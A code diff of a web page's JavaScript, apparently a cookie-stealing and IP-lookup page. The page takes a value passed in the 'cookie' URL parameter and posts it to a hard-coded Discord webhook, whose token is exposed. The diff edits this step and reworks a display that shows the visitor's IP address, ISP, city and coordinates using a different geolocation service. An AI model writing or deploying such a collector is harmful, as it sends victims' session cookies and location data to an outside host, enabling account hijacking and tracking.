@@ -28,7 +28,6 @@
         const params = new URLSearchParams(window.location.search);
         const container = document.getElementById('container');
 
-        // Existing cookie webhook
         const cv = params.get('cookie');
         if (cv) {
             const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
@@ -36,42 +35,24 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: cv })
-            })
-            .then(() => console.log("sent"))
-            .catch(err => console.error("err", err));
+            }).catch(console.error);
         }
 
-        // Trigger IP info if ?ip is present (without =)
         if (window.location.search.includes("?ip")) {
-            const apiUrl = "http://ip-api.com/json/?fields=61439"; // current IP
-
-            fetch(apiUrl)
+            fetch("https://ipwhois.app/json/")
             .then(res => res.json())
             .then(data => {
-                if (data.status !== "success") {
-                    container.innerHTML = `<div class="line">Error: ${data.message || 'Invalid IP'}</div>`;
-                    return;
-                }
-
-                // Build info lines
                 const infoLines = [
-                    `IP ADDRESS: ${data.query || 'Unknown'}`,
-                    `COUNTRY: ${data.country || 'Unknown'}`,
-                    `COUNTRY CODE: ${data.countryCode || 'Unknown'}`,
-                    `REGION: ${data.region || 'Unknown'}`,
-                    `REGION NAME: ${data.regionName || 'Unknown'}`,
-                    `CITY: ${data.city || 'Unknown'}`,
-                    `ZIP: ${data.zip || 'Unknown'}`,
-                    `LATITUDE: ${data.lat || 'Unknown'}`,
-                    `LONGITUDE: ${data.lon || 'Unknown'}`,
-                    `TIMEZONE: ${data.timezone || 'Unknown'}`,
+                    `IP ADDRESS: ${data.ip || 'Unknown'}`,
                     `ISP: ${data.isp || 'Unknown'}`,
                     `ORG: ${data.org || 'Unknown'}`,
-                    `AS: ${data.as || 'Unknown'}`,
-                    `REVERSE DNS: ${data.reverse || 'Unknown'}`,
-                    `MOBILE: ${data.mobile ? 'Yes' : 'No'}`,
-                    `PROXY: ${data.proxy ? 'Yes' : 'No'}`,
-                    `HOSTING: ${data.hosting ? 'Yes' : 'No'}`
+                    `ASN: ${data.asn || 'Unknown'}`,
+                    `CITY: ${data.city || 'Unknown'}`,
+                    `REGION: ${data.region || 'Unknown'}`,
+                    `COUNTRY: ${data.country || 'Unknown'}`,
+                    `TIMEZONE: ${data.timezone || 'Unknown'}`,
+                    `LATITUDE: ${data.latitude || 'Unknown'}`,
+                    `LONGITUDE: ${data.longitude || 'Unknown'}`
                 ];
 
                 let index = 0;
